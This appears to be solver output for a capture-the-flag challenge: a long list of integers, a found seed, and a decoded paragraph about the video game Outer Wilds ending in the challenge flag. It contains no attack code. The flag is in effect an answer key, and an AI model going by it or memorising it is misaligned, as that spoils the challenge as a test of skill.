548 176 441 643 298 514 133 566 578 422 209 263 264 400 479 418 703 424 262 368 289 59 492 389 676 676 477 398 191 8 573 384 191 535 117 610 673 596 221 448 347 591 264 668 462 585 359 3 483 399 281 86 480 626 205 477 648 319 401 99 186 84 350 578 381 508 542 388 504 81 287 83 342 285 578 169 441 190 18 623 618 490 270 72 198 481 467 630 564 428 199 434 272 365 89 199 463 414 2 209 514 353 44 83 481 316 297 275 147 126 79 407 20 398 344 105 267 364 56 598 443 117 314 248 568 140 386 22 220 65 524 252 0 210 592 25 100 142 588 231 374 419 247 181 50 197 334 428 365 482 420 282 453 440 233 570 410 145 255 205 537 519 76 337 504 347 83 410 338 327 120 237 530 348 315 172 347 271 378 417 52 191 207 530 405 262 380 356 368 475 116 352 25 283 453 138 185 464 391 121 149 515 379 245 373 522 445 386 16 140 308 250 58 177 295 136 438 154 181 155 48 299 154 252 243 347 168 246 237 161 383 187 366 161 273 196 30 368 467 414 338 347 390 450 29 443 42 219 382 45 78 277 60 115 2 393 9 335 379 2 407 79 54 304 204 30 455 318 89 408 287 395 1 116 5 70 112 393 130 178 437 104 145 172 266 7 195 45 46 133 293 384 120 93 361 173 310 340 229 376 154 209 379 364 58 25 297 313 94 82 395 162 199 112 230 34 331 129 164 14 172 138 269 74 314 297 15 143 223 353 362 295 125 306 386 28 8 148 297 283 341 300 259 50 352 374 194 193 315 250 165 81 168 253 47 333 323 123 7 86 247 11 250 358 19 112 181 319 162 160 123 267 331 321 179 5 191 239 193 254 94 254 57 171 37 33 324 303 246 78 143 39 77 67 229 172 151 116 285 35 265 209 160 278 90 198 39 253 142 225 32 24 220 146 188 242 151 227 140 156 243 126 149 237 44 182 112 57 269 135 143 266 163 37 266 228 14 186 67 42 269 272 260 49 111 114 70 127 216 100 6 273 49 144 198 197 125 42 65 4 216 81 177 122 218 218 79 126 205 23 31 72 83 163 113 156 157 51 75 208 14 25 243 117 33 195 133 16 181 166 221 146 17 63 131 184 133 172 91 127 146 100 223 112 84 67 172 75 219 201 87 72 158 202 15 162 141 65 60 186 49 52 160 37 165 179 103 79 127 63 54 117 154 127 181 125 128 56 88 104 148 3 103 52 32 51 86 108 21 121 81 175 32 17 49 149 143 144 89 11 104 51 124 124 46 85 70 139 86 131 110 22 149 112 24 109 26 9 15 28 60 73 86 43 34 131 20 96 127 119 73 134 110 64 47 22 42 17 36 71 26 78 4 116 34 69 45 74 118 51 103 111 1 50 44 55 106 93 106 9 40 2 50 96 15 7 24 86 90 92 70 29 78 21 34 45 35 1 80 52 58 61 53 10 38 17 64 36 39 42 45 63 17 37 20 9 14 20 50 17 6 61 33 28 24 14 7 19 15 33 51 2 6 50 12 52 7 6 26 46 12 9 9 9 42 24 2 2 38 38 30 28 20 25 30 17 24 11 25 3 21 24 23 6 19 1 15 12 0 18 6 0 12 13 8 2 6 2 6 5 5 6 5 4 1 1 1 0

Found with seed: 1739419063
Result: Outer Wilds is an action-adventure video game set in a small planetary system in which the player character, an unnamed space explorer referred to as the Hatchling, explores and investigates its mysteries in a self-directed manner. Whenever the Hatchling dies, the game resets to the beginning; this happens regardless after 22 minutes of gameplay due to the sun going supernova. The player uses these repeated time loops to discover the secrets of the Nomai, an alien species that has left ruins scattered throughout the planetary system, including why the sun is exploding. A downloadable content expansion, Echoes of the Eye, adds additional locations and mysteries to the game. lactf{are_you_ready_to_learn_what_comes_next?}
```
